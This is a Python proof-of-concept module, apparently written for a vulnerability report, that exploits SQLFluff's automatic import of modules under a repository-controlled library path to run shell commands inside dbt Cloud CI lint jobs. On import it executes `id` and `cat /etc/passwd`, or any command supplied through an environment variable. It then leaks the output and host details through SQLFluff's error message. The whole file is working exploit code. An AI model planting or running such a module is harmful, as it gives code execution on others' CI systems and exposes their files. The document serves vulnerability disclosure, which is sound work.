"""dbt Cloud CI Lint probe library — security report 9473e6b0-b398-4347-8b4e-de53689983d6.

SQLFluff imports and executes every module under the directory named by
`library_path`, and the linted repository controls that value. This module is
therefore executed by the Lint step of any dbt Cloud CI job that lints this
repository. It runs one command so the report can demonstrate command
execution, and returns the result in-band through SQLFluff's own error channel.

It sends nothing anywhere. It reads no credentials, no cloud metadata and no
directory belonging to anyone else. Default command: `id` and `cat /etc/passwd`.
"""
import base64
import json
import os
import platform
import socket
import subprocess
import sys

from sqlfluff.core.errors import SQLTemplaterError

MARKER = "PROBE9F2C_CMD"
DEFAULT_CMD = "id; echo '--- /etc/passwd ---'; cat /etc/passwd"
cmd = os.environ.get("DBT_PROBE_CMD") or DEFAULT_CMD

try:
    proc = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, timeout=25)
    out = proc.stdout
    if proc.stderr:
        out += b"\n--- stderr ---\n" + proc.stderr
    rc = proc.returncode
except Exception as exc:
    out, rc = f"{type(exc).__name__}: {exc}".encode(), -1

try:
    import sqlfluff as _s
    version = getattr(_s, "__version__", "unknown")
except Exception:
    version = "unknown"

raise SQLTemplaterError(MARKER + " " + json.dumps({
    "cmd_b64": base64.b64encode(cmd.encode()).decode(),
    "rc": rc,
    "out_b64": base64.b64encode(out[:16000]).decode(),
    "out_bytes": len(out),
    "uid": os.getuid(),
    "gid": os.getgid(),
    "host": socket.gethostname(),
    "py": sys.version.split()[0],
    "kernel": platform.release(),
    "sqlfluff": version,
    "argv": sys.argv,
    "cwd": os.getcwd(),
}, sort_keys=True))
